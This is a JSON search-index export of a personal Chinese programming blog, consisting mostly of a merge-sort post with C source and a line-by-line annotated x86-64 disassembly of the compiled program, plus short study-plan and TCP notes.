{"/about/":{"data":{"":" The pain you feel when you write is actually the pain of clarifying your thinking.(David Perell)"},"title":"About"},"/blog/2022-plan/":{"data":{"":" https://www.bilibili.com/video/BV1Cx411S7HJ?p=2 https://see.stanford.edu/Course/CS107 ComputerSystem:A programer perspective Edtion3 English rust-lang kubernetes "},"title":"2022-plan"},"/blog/about/":{"data":{"":" The pain you feel when you write is actually the pain of clarifying your thinking.(David Perell)"},"title":"About"},"/blog/acknowledgement-timeout-retry-sequence-number/":{"data":{"":"","#":"TCP 要解决的问题 ","references#references":" tcp-congestion-control tcp-congestion-control-ppt "},"title":"acknowledgement-timeout-retry-sequence-number"},"/blog/algorithm-merge-sort/":{"data":{"":"","merge-sort#merge sort":"","reference#reference":"merge sort merge sort C code #include \u003cstdio.h\u003e\rvoid merge(int* array, int start, int mid, int end){\r// start = 0\r// mid = 3\r// end = 7\rint tempArrayLength = end - start + 1; // 8\rint tempArray[tempArrayLength]; // tempArray[8]\rint p1 = start; // 0\rint p2 = mid + 1; // 4\rint p = 0;\r// 比较两个小集合，依次放入大集合, 第一个 while 循环\rwhile (p1 \u003c= mid \u0026\u0026 p2 \u003c= end){ p1 \u003c=3 \u0026\u0026 p2 \u003c=7\rif(array[p1] \u003c= array[p2]){ // 7 \u003c= 5 XXX\rtempArray[p++] = array[p1++];\r} else {\rtempArray[p++] = array[p2++]; // tempArray[0] = 5\r}\r}\r// 左侧集合还有剩余，依次放入大集合， 第二个 while 循环\rwhile (p1 \u003c= mid){ // 2 \u003c= 2 tempArray[p++] = array[p1++]; tempArray[1] = 7\r}\r// 右侧集合还有剩余，依次放入大集合，第三个 while 循环\rwhile (p2 \u003c= end){ // 4 \u003c= 3 XXX\rtempArray[p++] = array[p2++]; // tempArray[1] = 9\r}\r// 大集合复制到原来的数组，for 循环\rfor (int i = 0; i \u003c tempArrayLength; i++) {\rarray[i + start] = tempArray[i]; // 3,9,5,7\r}\r}\rvoid mergeSort(int* array, int start, int end){\rif(start \u003c end){\rint mid = (start + end) / 2;\rmergeSort(array, start, mid); // mergeSort_L(array, start, mid);\rmergeSort(array, mid+1, end); // mergeSort_R(array, mid+1, end);\rmerge(array, start, mid, end);\r}\r}\rint main(){\rint array[8] = {9, 3, 7, 5, 8, 6, 4, 10};\rmergeSort(array, 0 , 7);\rfor (int i = 0; i \u003c 8; i++)\r{\rprintf(\"%d#\",array[i]);\r}\r} x64 汇编代码分析 mergesort: file format elf64-x86-64 ; 64bits 汇编代码 Disassembly of section .init: 0000000000000548 \u003c_init\u003e: 548:\t48 83 ec 08 sub $0x8,%rsp 54c:\t48 8b 05 95 0a 20 00 mov 0x200a95(%rip),%rax # 200fe8 \u003c__gmon_start__\u003e 553:\t48 85 c0 test %rax,%rax 556:\t74 02 je 55a \u003c_init+0x12\u003e 558:\tff d0 callq *%rax 55a:\t48 83 c4 08 add $0x8,%rsp 55e:\tc3 retq Disassembly of section .plt: 0000000000000560 \u003c.plt\u003e: 560:\tff 35 52 0a 20 00 pushq 0x200a52(%rip) # 200fb8 \u003c_GLOBAL_OFFSET_TABLE_+0x8\u003e 566:\tff 25 54 0a 20 00 jmpq *0x200a54(%rip) # 200fc0 \u003c_GLOBAL_OFFSET_TABLE_+0x10\u003e 56c:\t0f 1f 40 00 nopl 0x0(%rax) 0000000000000570 \u003c__stack_chk_fail@plt\u003e: 570:\tff 25 52 0a 20 00 jmpq *0x200a52(%rip) # 200fc8 \u003c__stack_chk_fail@GLIBC_2.4\u003e 576:\t68 00 00 00 00 pushq $0x0 57b:\te9 e0 ff ff ff jmpq 560 \u003c.plt\u003e 0000000000000580 \u003cprintf@plt\u003e: 580:\tff 25 4a 0a 20 00 jmpq *0x200a4a(%rip) # 200fd0 \u003cprintf@GLIBC_2.2.5\u003e 586:\t68 01 00 00 00 pushq $0x1 58b:\te9 d0 ff ff ff jmpq 560 \u003c.plt\u003e Disassembly of section .plt.got: 0000000000000590 \u003c__cxa_finalize@plt\u003e: 590:\tff 25 62 0a 20 00 jmpq *0x200a62(%rip) # 200ff8 \u003c__cxa_finalize@GLIBC_2.2.5\u003e 596:\t66 90 xchg %ax,%ax Disassembly of section .text: ; 代码区 00000000000005a0 \u003c_start\u003e: 5a0:\t31 ed xor %ebp,%ebp ; ebp = 0 5a2:\t49 89 d1 mov %rdx,%r9 5a5:\t5e pop %rsi 5a6:\t48 89 e2 mov %rsp,%rdx 5a9:\t48 83 e4 f0 and $0xfffffffffffffff0,%rsp 5ad:\t50 push %rax 5ae:\t54 push %rsp 5af:\t4c 8d 05 aa 04 00 00 lea 0x4aa(%rip),%r8 # a60 \u003c__libc_csu_fini\u003e 5b6:\t48 8d 0d 33 04 00 00 lea 0x433(%rip),%rcx # 9f0 \u003c__libc_csu_init\u003e 5bd:\t48 8d 3d 79 03 00 00 lea 0x379(%rip),%rdi # 93d \u003cmain\u003e 5c4:\tff 15 16 0a 20 00 callq *0x200a16(%rip) # 200fe0 \u003c__libc_start_main@GLIBC_2.2.5\u003e 5ca:\tf4 hlt 5cb:\t0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) 00000000000005d0 \u003cderegister_tm_clones\u003e: 5d0:\t48 8d 3d 39 0a 20 00 lea 0x200a39(%rip),%rdi # 201010 \u003c__TMC_END__\u003e 5d7:\t55 push %rbp 5d8:\t48 8d 05 31 0a 20 00 lea 0x200a31(%rip),%rax # 201010 \u003c__TMC_END__\u003e 5df:\t48 39 f8 cmp %rdi,%rax 5e2:\t48 89 e5 mov %rsp,%rbp 5e5:\t74 19 je 600 \u003cderegister_tm_clones+0x30\u003e 5e7:\t48 8b 05 ea 09 20 00 mov 0x2009ea(%rip),%rax # 200fd8 \u003c_ITM_deregisterTMCloneTable\u003e 5ee:\t48 85 c0 test %rax,%rax 5f1:\t74 0d je 600 \u003cderegister_tm_clones+0x30\u003e 5f3:\t5d pop %rbp 5f4:\tff e0 jmpq *%rax 5f6:\t66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 5fd:\t00 00 00 600:\t5d pop %rbp 601:\tc3 retq 602:\t0f 1f 40 00 nopl 0x0(%rax) 606:\t66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 60d:\t00 00 00 0000000000000610 \u003cregister_tm_clones\u003e: 610:\t48 8d 3d f9 09 20 00 lea 0x2009f9(%rip),%rdi # 201010 \u003c__TMC_END__\u003e 617:\t48 8d 35 f2 09 20 00 lea 0x2009f2(%rip),%rsi # 201010 \u003c__TMC_END__\u003e 61e:\t55 push %rbp 61f:\t48 29 fe sub %rdi,%rsi 622:\t48 89 e5 mov %rsp,%rbp 625:\t48 c1 fe 03 sar $0x3,%rsi 629:\t48 89 f0 mov %rsi,%rax 62c:\t48 c1 e8 3f shr $0x3f,%rax 630:\t48 01 c6 add %rax,%rsi 633:\t48 d1 fe sar %rsi 636:\t74 18 je 650 \u003cregister_tm_clones+0x40\u003e 638:\t48 8b 05 b1 09 20 00 mov 0x2009b1(%rip),%rax # 200ff0 \u003c_ITM_registerTMCloneTable\u003e 63f:\t48 85 c0 test %rax,%rax 642:\t74 0c je 650 \u003cregister_tm_clones+0x40\u003e 644:\t5d pop %rbp 645:\tff e0 jmpq *%rax 647:\t66 0f 1f 84 00 00 00 nopw 0x0(%rax,%rax,1) 64e:\t00 00 650:\t5d pop %rbp 651:\tc3 retq 652:\t0f 1f 40 00 nopl 0x0(%rax) 656:\t66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 65d:\t00 00 00 0000000000000660 \u003c__do_global_dtors_aux\u003e: 660:\t80 3d a9 09 20 00 00 cmpb $0x0,0x2009a9(%rip) # 201010 \u003c__TMC_END__\u003e 667:\t75 2f jne 698 \u003c__do_global_dtors_aux+0x38\u003e 669:\t48 83 3d 87 09 20 00 cmpq $0x0,0x200987(%rip) # 200ff8 \u003c__cxa_finalize@GLIBC_2.2.5\u003e 670:\t00 671:\t55 push %rbp 672:\t48 89 e5 mov %rsp,%rbp 675:\t74 0c je 683 \u003c__do_global_dtors_aux+0x23\u003e 677:\t48 8b 3d 8a 09 20 00 mov 0x20098a(%rip),%rdi # 201008 \u003c__dso_handle\u003e 67e:\te8 0d ff ff ff callq 590 \u003c__cxa_finalize@plt\u003e 683:\te8 48 ff ff ff callq 5d0 \u003cderegister_tm_clones\u003e 688:\tc6 05 81 09 20 00 01 movb $0x1,0x200981(%rip) # 201010 \u003c__TMC_END__\u003e 68f:\t5d pop %rbp 690:\tc3 retq 691:\t0f 1f 80 00 00 00 00 nopl 0x0(%rax) 698:\tf3 c3 repz retq 69a:\t66 0f 1f 44 00 00 nopw 0x0(%rax,%rax,1) 00000000000006a0 \u003cframe_dummy\u003e: 6a0:\t55 push %rbp 6a1:\t48 89 e5 mov %rsp,%rbp 6a4:\t5d pop %rbp 6a5:\te9 66 ff ff ff jmpq 610 \u003cregister_tm_clones\u003e 00000000000006aa \u003cmerge\u003e: 6aa:\t55 push %rbp 6ab:\t48 89 e5 mov %rsp,%rbp ; rbp = rsp 6ae:\t48 83 ec 50 sub $0x50,%rsp ; rsp = rsp - 0x50 开辟栈帧 6b2:\t48 89 7d c8 mov %rdi,-0x38(%rbp) ; 第一个参数 \u0026array[0] 6b6:\t89 75 c4 mov %esi,-0x3c(%rbp) ; 第二个参数 start 6b9:\t89 55 c0 mov %edx,-0x40(%rbp) ; 第三个参数 mid 6bc:\t89 4d bc mov %ecx,-0x44(%rbp) ; 第四个参数 end 6bf:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax ; 哨兵值判定栈帧是否出了问题。 6c6:\t00 00 6c8:\t48 89 45 f8 mov %rax,-0x8(%rbp) ; 哨兵值 6cc:\t31 c0 xor %eax,%eax ; eax = 0 6ce:\t48 89 e0 mov %rsp,%rax ; rax = rsp 6d1:\t48 89 c6 mov %rax,%rsi ; rsi = rax = rsp 记录这个 rsp 的值 6d4:\t8b 45 bc mov -0x44(%rbp),%eax ; eax = end 6d7:\t2b 45 c4 sub -0x3c(%rbp),%eax ; eax = end - start 6da:\t83 c0 01 add $0x1,%eax ; tempArrayLength = eax = (end - start) + 1 6dd:\t89 45 e4 mov %eax,-0x1c(%rbp) ; tempArrayLength = (end - start) + 1 复制到 rbp - 0x1c 内存处 6e0:\t8b 45 e4 mov -0x1c(%rbp),%eax ; eax = tempArrayLength 6e3:\t48 63 d0 movslq %eax,%rdx ; rdx = tempArrayLength, cltq 32bit 扩展为 64bit 6e6:\t48 83 ea 01 sub $0x1,%rdx ; rdx = (tempArrayLength) - 1 = end - start 6ea:\t48 89 55 e8 mov %rdx,-0x18(%rbp) ; end - start 复制到 rbp - 0x18 内存地址处 6ee:\t48 63 d0 movslq %eax,%rdx ; rdx = (end - start) + 1 ? tempArrayLength 6f1:\t49 89 d2 mov %rdx,%r10 ; r10 = (end - start) + 1 6f4:\t41 bb 00 00 00 00 mov $0x0,%r11d ; r11d = 0 6fa:\t48 63 d0 movslq %eax,%rdx ; rdx = (end - start) + 1 ? tempArrayLength 6fd:\t49 89 d0 mov %rdx,%r8 ; r8 = (end - start) + 1 ? tempArrayLength 700:\t41 b9 00 00 00 00 mov $0x0,%r9d ; r9d = 0 706:\t48 98 cltq ; 相当于 movslq %eax,%rax. 708:\t48 c1 e0 02 shl $0x2,%rax ; rax = ((end - start) + 1) * 4 70c:\t48 8d 50 03 lea 0x3(%rax),%rdx ; rdx = 4 * ((end - start) + 1) + 3 710:\tb8 10 00 00 00 mov $0x10,%eax ; eax = 16 715:\t48 83 e8 01 sub $0x1,%rax ; rax = 16 - 1 = 15 719:\t48 01 d0 add %rdx,%rax ; rax = rax + rdx = 15 + 4 * ((end - start) + 1) + 3 = 4 * (end - start) + 22 71c:\tbf 10 00 00 00 mov $0x10,%edi ; edi = 16 721:\tba 00 00 00 00 mov $0x0,%edx ; edx = 0 726:\t48 f7 f7 div %rdi ; (rdx(high-32bit):rax(low-32bit))/rdi , quotient(商) in %rax, remainder(余数) in %rdx 729:\t48 6b c0 10 imul $0x10,%rax,%rax ; rax = rax * 16 72d:\t48 29 c4 sub %rax,%rsp ; rsp = rsp - rax 分配空间 730:\t48 89 e0 mov %rsp,%rax ; rax = rsp 733:\t48 83 c0 03 add $0x3,%rax ; rax = rsp + 3 737:\t48 c1 e8 02 shr $0x2,%rax ; rax = (rsp + 3) \u003e\u003e 2 73b:\t48 c1 e0 02 shl $0x2,%rax ; rax = ((rsp + 3) \u003e\u003e 2) \u003c\u003c2 73f:\t48 89 45 f0 mov %rax,-0x10(%rbp) ; 743:\t8b 45 c4 mov -0x3c(%rbp),%eax ; eax = start 746:\t89 45 dc mov %eax,-0x24(%rbp) ; start 复制到 rbp - 0x24(p1) 处 749:\t8b 45 c0 mov -0x40(%rbp),%eax ; eax = mid 74c:\t83 c0 01 add $0x1,%eax ; eax = mid + 1 74f:\t89 45 d8 mov %eax,-0x28(%rbp) ; mid + 1 复制到 rbp - 0x28(p2) 处 752:\tc7 45 d4 00 00 00 00 movl $0x0,-0x2c(%rbp) ; 0 复制到 rbp - 0x2c(p) 处 759:\te9 90 00 00 00 jmpq 7ee \u003cmerge+0x144\u003e ; 无条件跳转, 0x144 表示要跳转出也就是 7ee 距离 merge(6aa) 之间的所有指令字节数是 0x144。。。。。。 ; if(array[p1] \u003c= array[p2]) 的判定 75e:\t8b 45 dc mov -0x24(%rbp),%eax ; rax = p1 761:\t48 98 cltq 763:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * p1 + 0 76a:\t00 76b:\t48 8b 45 c8 mov -0x38(%rbp),%rax ; rax = \u0026array[0] 76f:\t48 01 d0 add %rdx,%rax ; rax = \u0026array[0] + 4 * p1 = \u0026array[p1] 772:\t8b 10 mov (%rax),%edx ; edx = array[p1] 774:\t8b 45 d8 mov -0x28(%rbp),%eax ; eax = p2 777:\t48 98 cltq 779:\t48 8d 0c 85 00 00 00 lea 0x0(,%rax,4),%rcx ; rcx = 4 * rax = 4 * p2 780:\t00 781:\t48 8b 45 c8 mov -0x38(%rbp),%rax ; rax = \u0026array[0] 785:\t48 01 c8 add %rcx,%rax ; rax = \u0026array[0] + 4 * p2 = \u0026array[p2] 788:\t8b 00 mov (%rax),%eax ; eax = array[p2] 78a:\t39 c2 cmp %eax,%edx ; cmp array[p2],array[p1] 78c:\t7f 31 jg 7bf \u003cmerge+0x115\u003e ; array[p1] \u003e array[p2] 跳到 else 78e:\t8b 45 dc mov -0x24(%rbp),%eax ; eax = p1 791:\t8d 50 01 lea 0x1(%rax),%edx ; edx = p1 + 1 794:\t89 55 dc mov %edx,-0x24(%rbp) ; p1 = p1 + 1 797:\t48 98 cltq 799:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * p1 7a0:\t00 7a1:\t48 8b 45 c8 mov -0x38(%rbp),%rax ; rax = \u0026array[0] 7a5:\t48 8d 0c 02 lea (%rdx,%rax,1),%rcx ; rcx = \u0026array[0] + 4 * p1 = \u0026array[p1] 7a9:\t8b 45 d4 mov -0x2c(%rbp),%eax ; eax = p 7ac:\t8d 50 01 lea 0x1(%rax),%edx ; edx = p + 1 7af:\t89 55 d4 mov %edx,-0x2c(%rbp) ; p = p + 1 7b2:\t8b 09 mov (%rcx),%ecx ; ecx = array[p1] 7b4:\t48 8b 55 f0 mov -0x10(%rbp),%rdx ;rdx = \u0026tempArray[0] 7b8:\t48 98 cltq 7ba:\t89 0c 82 mov %ecx,(%rdx,%rax,4) ; tempArray[p] = array[p1] 7bd:\teb 2f jmp 7ee \u003cmerge+0x144\u003e ; 开启下一轮判定\u003e\u003e\u003e\u003e\u003e\u003e\u003e 7bf:\t8b 45 d8 mov -0x28(%rbp),%eax ; eax = p2 $$$ begin else array[p1] \u003e array[p2] 7c2:\t8d 50 01 lea 0x1(%rax),%edx ; edx = p2 + 1 7c5:\t89 55 d8 mov %edx,-0x28(%rbp) ; p2 = p2 + 1 7c8:\t48 98 cltq 7ca:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * p2 7d1:\t00 7d2:\t48 8b 45 c8 mov -0x38(%rbp),%rax ; rax = \u0026array[0] 7d6:\t48 8d 0c 02 lea (%rdx,%rax,1),%rcx ; rcx = rdx + 1 * rax = \u0026array[0] + 4 * p2 = \u0026array[p2] 7da:\t8b 45 d4 mov -0x2c(%rbp),%eax ; eax = p 7dd:\t8d 50 01 lea 0x1(%rax),%edx ; edx = p + 1 7e0:\t89 55 d4 mov %edx,-0x2c(%rbp) ; p = p + 1 7e3:\t8b 09 mov (%rcx),%ecx ; ecx = array[p2] 7e5:\t48 8b 55 f0 mov -0x10(%rbp),%rdx ; rdx = \u0026tempArray[0] , 临时数组地址 7e9:\t48 98 cltq 7eb:\t89 0c 82 mov %ecx,(%rdx,%rax,4) ; tempArray[p] = array[p2] $$$$$ end else 7ee:\t8b 45 dc mov -0x24(%rbp),%eax ; eax = p1 下一轮判定\u003e\u003e\u003e\u003e\u003e\u003e\u003e 7f1:\t3b 45 c0 cmp -0x40(%rbp),%eax ; cmp mid,p1 7f4:\t7f 3d jg 833 \u003cmerge+0x189\u003e ; p1 \u003e mid 跳出去 7f6:\t8b 45 d8 mov -0x28(%rbp),%eax ; eax = p2 此时 p1 \u003c= mid, 判定 p2 \u003c= end 吗？ 7f9:\t3b 45 bc cmp -0x44(%rbp),%eax ; cmp end,p2 7fc:\t0f 8e 5c ff ff ff jle 75e \u003cmerge+0xb4\u003e ; 此时 p1 \u003c= mid,p2 \u003c= end，进入 if。 802:\teb 2f jmp 833 \u003cmerge+0x189\u003e; 不满足第一个 while 循环，进入第二个 while 循环 ; p1 \u003c= mid 循环体开始 804:\t8b 45 dc mov -0x24(%rbp),%eax ; eax = p1 807:\t8d 50 01 lea 0x1(%rax),%edx ; edx = p1 + 1 80a:\t89 55 dc mov %edx,-0x24(%rbp) ; p1 = p1 + 1 #### 80d:\t48 98 cltq ; movslq %eax,%rax 80f:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * p1 816:\t00 817:\t48 8b 45 c8 mov -0x38(%rbp),%rax ; rax = \u0026array[0] 81b:\t48 8d 0c 02 lea (%rdx,%rax,1),%rcx ; rcx = \u0026array[p1] 81f:\t8b 45 d4 mov -0x2c(%rbp),%eax ; eax = p 822:\t8d 50 01 lea 0x1(%rax),%edx ; edx = p + 1 825:\t89 55 d4 mov %edx,-0x2c(%rbp) ; p = p + 1 828:\t8b 09 mov (%rcx),%ecx ; ecx = array[p1] 82a:\t48 8b 55 f0 mov -0x10(%rbp),%rdx ; rdx = \u0026tempArray[0] 82e:\t48 98 cltq 830:\t89 0c 82 mov %ecx,(%rdx,%rax,4) ; tempArray[p] = array[p1] ; 第二个 while 循环 也就是 while(p1 \u003c= mid) 833:\t8b 45 dc mov -0x24(%rbp),%eax ; eax = p1 836:\t3b 45 c0 cmp -0x40(%rbp),%eax ; cmp mid, p1 判定 p1 \u003c= mid 吗？ 839:\t7e c9 jle 804 \u003cmerge+0x15a\u003e ; p1 \u003c= mid ; p1 \u003c= mid 循环体结束 83b:\teb 2f jmp 86c \u003cmerge+0x1c2\u003e ; 第二个 while 循环的 p1 \u003c= mid不满足， 短路。直接进入第三个while(p2 \u003c= end) ; p2 \u003c= end 的循环体开始 83d:\t8b 45 d8 mov -0x28(%rbp),%eax ; eax = p2 840:\t8d 50 01 lea 0x1(%rax),%edx ; edx = p2 + 1 843:\t89 55 d8 mov %edx,-0x28(%rbp) ; p = p2 + 1 846:\t48 98 cltq 848:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * p2 84f:\t00 850:\t48 8b 45 c8 mov -0x38(%rbp),%rax ; rax = \u0026array[0] 854:\t48 8d 0c 02 lea (%rdx,%rax,1),%rcx ; rcx = \u0026array[0] + 4 * p2 = \u0026array[p2] 858:\t8b 45 d4 mov -0x2c(%rbp),%eax ; eax = p 85b:\t8d 50 01 lea 0x1(%rax),%edx ; eax = p + 1 85e:\t89 55 d4 mov %edx,-0x2c(%rbp) ; p = p + 1 861:\t8b 09 mov (%rcx),%ecx ; ecx = array[p2] 863:\t48 8b 55 f0 mov -0x10(%rbp),%rdx ;rdx = \u0026tempArray[0] 867:\t48 98 cltq 869:\t89 0c 82 mov %ecx,(%rdx,%rax,4) ; tempArray[p] = array[p2] ; 第三个 while 循环 86c:\t8b 45 d8 mov -0x28(%rbp),%eax ; eax = p2 开始判定 p2 \u003c= end 吗？ 86f:\t3b 45 bc cmp -0x44(%rbp),%eax ; cmp end, p2 872:\t7e c9 jle 83d \u003cmerge+0x193\u003e ; 满足 p2 \u003c= end，第三个 while 循环 ; p2 \u003e end 874:\tc7 45 e0 00 00 00 00 movl $0x0,-0x20(%rbp) ; 此时 p2 \u003e end 了。i = 0 87b:\teb 2d jmp 8aa \u003cmerge+0x200\u003e ; 直接跳到 for 循环 ; for(int i = 0; i \u003c tempArrayLength; i++) 开始 87d:\t8b 55 e0 mov -0x20(%rbp),%edx ; edx = i 880:\t8b 45 c4 mov -0x3c(%rbp),%eax ; eax = start 883:\t01 d0 add %edx,%eax ; eax = start + i 885:\t48 98 cltq 887:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * (start + i) 88e:\t00 88f:\t48 8b 45 c8 mov -0x38(%rbp),%rax ; rax = \u0026array[0] 893:\t48 8d 0c 02 lea (%rdx,%rax,1),%rcx ; rcx = array[start + i] 897:\t48 8b 45 f0 mov -0x10(%rbp),%rax ; rax = \u0026tempArray[0] 89b:\t8b 55 e0 mov -0x20(%rbp),%edx ; edx = i 89e:\t48 63 d2 movslq %edx,%rdx 8a1:\t8b 04 90 mov (%rax,%rdx,4),%eax ; eax = tempArray[i] 8a4:\t89 01 mov %eax,(%rcx) ; array[start + i] = tempArray[i]; 8a6:\t83 45 e0 01 addl $0x1,-0x20(%rbp) ; i = i + 1 ; 判定 i \u003c tempArrayLength 吗？ 8aa:\t8b 45 e0 mov -0x20(%rbp),%eax ; eax = i 8ad:\t3b 45 e4 cmp -0x1c(%rbp),%eax ; cmp tempArrayLength, i 8b0:\t7c cb jl 87d \u003cmerge+0x1d3\u003e ; i \u003c tempArrayLength ; for(int i = 0; i \u003c tempArrayLength; i++) 结束 ; 此时 i \u003e= tempArrayLength 了。 8b2:\t48 89 f4 mov %rsi,%rsp ; rsp = rsi(记录的 rsp 的值) i \u003e= tempArrayLength 8b5:\t90 nop 8b6:\t48 8b 45 f8 mov -0x8(%rbp),%rax ; rax = %fs:0x28 8ba:\t64 48 33 04 25 28 00 xor %fs:0x28,%rax ;The OF and CF flags are cleared; the SF, ZF, and PF flags are set according to the result. The state of the AF flag is undefined. 8c1:\t00 00 8c3:\t74 05 je 8ca \u003cmerge+0x220\u003e ; ZF = 0 说明栈帧没出问题，退出函数。 8c5:\te8 a6 fc ff ff callq 570 \u003c__stack_chk_fail@plt\u003e ; 能执行到这说明栈帧出问题了。。。 8ca:\tc9 leaveq 8cb:\tc3 retq 00000000000008cc \u003cmergeSort\u003e: 8cc:\t55 push %rbp 8cd:\t48 89 e5 mov %rsp,%rbp ; rbp = rsp 8d0:\t48 83 ec 20 sub $0x20,%rsp ; rsp = rsp - 0x20 8d4:\t48 89 7d e8 mov %rdi,-0x18(%rbp) ;\u0026array[0] 复制到 rbp - 0x18 地址处 8d8:\t89 75 e4 mov %esi,-0x1c(%rbp) ;第二个参数 (start) 复制到 rbp -0x1c 地址处 8db:\t89 55 e0 mov %edx,-0x20(%rbp) ;第三个参数 (end) 复制到 rbp -0x20 地址处 8de:\t8b 45 e4 mov -0x1c(%rbp),%eax ;eax = start 8e1:\t3b 45 e0 cmp -0x20(%rbp),%eax ;cmp end,start 8e4:\t7d 54 jge 93a \u003cmergeSort+0x6e\u003e ; start \u003e= end，直接退出函数。 8e6:\t8b 55 e4 mov -0x1c(%rbp),%edx ; edx = start 此时 start \u003c end 8e9:\t8b 45 e0 mov -0x20(%rbp),%eax ; eax = end 8ec:\t01 d0 add %edx,%eax ; eax = start + end 8ee:\t89 c2 mov %eax,%edx ; edx = start + end 8f0:\tc1 ea 1f shr $0x1f,%edx ; edx = edx \u003e\u003e 31 (start + end)/pow(2,31) 相当于是 0 了😂 8f3:\t01 d0 add %edx,%eax ; eax = (start + end) + 0 8f5:\td1 f8 sar %eax ; eax = (start + end) / 2 算术右移一位，最高位补上 eax 的符号位 8f7:\t89 45 fc mov %eax,-0x4(%rbp) ; mid = (start + end) / 2 复制到 rbp - 0x4 内存地址处 8fa:\t8b 55 fc mov -0x4(%rbp),%edx ; edx = mid(start + end) / 2 也就是准备第三个参数 mid 8fd:\t8b 4d e4 mov -0x1c(%rbp),%ecx ; ecx = start 900:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 904:\t89 ce mov %ecx,%esi ; esi = start ; 第二个参数 906:\t48 89 c7 mov %rax,%rdi ; rdi = \u0026array[0] ; 第一个参数 909:\te8 be ff ff ff callq 8cc \u003cmergeSort\u003e ; 调用 mergeSort 左侧 mergeSort 90e:\t8b 45 fc mov -0x4(%rbp),%eax ; eax = mid = (start + end) / 2 911:\t8d 48 01 lea 0x1(%rax),%ecx ; mid = mid + 1 914:\t8b 55 e0 mov -0x20(%rbp),%edx ; edx = end 第三个参数 917:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 91b:\t89 ce mov %ecx,%esi ; esi = mid 第二个参数 91d:\t48 89 c7 mov %rax,%rdi ; rdi = \u0026array[0] 第一个参数 920:\te8 a7 ff ff ff callq 8cc \u003cmergeSort\u003e ; 调用 mergeSort 右侧 mergeSort 925:\t8b 4d e0 mov -0x20(%rbp),%ecx ; ecx = end ; 第四个参数 928:\t8b 55 fc mov -0x4(%rbp),%edx ; edx = mid = (start + end) / 2 第三个参数 92b:\t8b 75 e4 mov -0x1c(%rbp),%esi ; esi = start ; 第二个参数 92e:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 932:\t48 89 c7 mov %rax,%rdi ; rdi = rax ; 第一个参数 935:\te8 70 fd ff ff callq 6aa \u003cmerge\u003e ; 调用 merge 开始 merge 93a:\t90 nop ; 从此处销毁栈帧 93b:\tc9 leaveq // 销毁栈帧，相当于 rsp = rbp，pop rbp 93c:\tc3 retq 000000000000093d \u003cmain\u003e: 93d:\t55 push %rbp 93e:\t48 89 e5 mov %rsp,%rbp 941:\t48 83 ec 40 sub $0x40,%rsp 945:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax 94c:\t00 00 94e:\t48 89 45 f8 mov %rax,-0x8(%rbp) 952:\t31 c0 xor %eax,%eax 954:\tc7 45 d0 09 00 00 00 movl $0x9,-0x30(%rbp) ; 0x9 复制到 rbp - 0x30 地址处。array[0] = 0x9 95b:\tc7 45 d4 03 00 00 00 movl $0x3,-0x2c(%rbp) ; 0x3 复制到 rbp - 0x2c 地址处。array[1] = 0x3 962:\tc7 45 d8 07 00 00 00 movl $0x7,-0x28(%rbp) ; 0x7 复制到 rbp - 0x28 地址处。array[2] = 0x7 969:\tc7 45 dc 05 00 00 00 movl $0x5,-0x24(%rbp) ; 0x5 复制到 rbp - 0x24 地址处。array[3] = 0x5 970:\tc7 45 e0 08 00 00 00 movl $0x8,-0x20(%rbp) ; 0x8 复制到 rbp - 0x20 地址处。array[4] = 0x8 977:\tc7 45 e4 06 00 00 00 movl $0x6,-0x1c(%rbp) ; 0x6 复制到 rbp - 0x1c 地址处。array[5] = 0x6 97e:\tc7 45 e8 04 00 00 00 movl $0x4,-0x18(%rbp) ; 0x4 复制到 rbp - 0x28 地址处。array[6] = 0x4 985:\tc7 45 ec 0a 00 00 00 movl $0xa,-0x14(%rbp) ; 0xa 复制到 rbp - 0x14 地址处。array[7] = 0xa 98c:\t48 8d 45 d0 lea -0x30(%rbp),%rax ; rax = \u0026array[0] 990:\tba 07 00 00 00 mov $0x7,%edx ; 第三个参数 7 995:\tbe 00 00 00 00 mov $0x0,%esi ; 第二个参数 0 99a:\t48 89 c7 mov %rax,%rdi ; 第一个参数 \u0026array[0] 99d:\te8 2a ff ff ff callq 8cc \u003cmergeSort\u003e ; 调用 mergeSort，地址偏移是 0x8cc 9a2:\tc7 45 cc 00 00 00 00 movl $0x0,-0x34(%rbp) 9a9:\teb 20 jmp 9cb \u003cmain+0x8e\u003e 9ab:\t8b 45 cc mov -0x34(%rbp),%eax 9ae:\t48 98 cltq 9b0:\t8b 44 85 d0 mov -0x30(%rbp,%rax,4),%eax 9b4:\t89 c6 mov %eax,%esi 9b6:\t48 8d 3d b7 00 00 00 lea 0xb7(%rip),%rdi # a74 \u003c_IO_stdin_used+0x4\u003e 9bd:\tb8 00 00 00 00 mov $0x0,%eax 9c2:\te8 b9 fb ff ff callq 580 \u003cprintf@plt\u003e 9c7:\t83 45 cc 01 addl $0x1,-0x34(%rbp) 9cb:\t83 7d cc 07 cmpl $0x7,-0x34(%rbp) 9cf:\t7e da jle 9ab \u003cmain+0x6e\u003e 9d1:\tb8 00 00 00 00 mov $0x0,%eax 9d6:\t48 8b 4d f8 mov -0x8(%rbp),%rcx 9da:\t64 48 33 0c 25 28 00 xor %fs:0x28,%rcx 9e1:\t00 00 9e3:\t74 05 je 9ea \u003cmain+0xad\u003e 9e5:\te8 86 fb ff ff callq 570 \u003c__stack_chk_fail@plt\u003e 9ea:\tc9 leaveq 9eb:\tc3 retq 9ec:\t0f 1f 40 00 nopl 0x0(%rax) 00000000000009f0 \u003c__libc_csu_init\u003e: 9f0:\t41 57 push %r15 9f2:\t41 56 push %r14 9f4:\t49 89 d7 mov %rdx,%r15 9f7:\t41 55 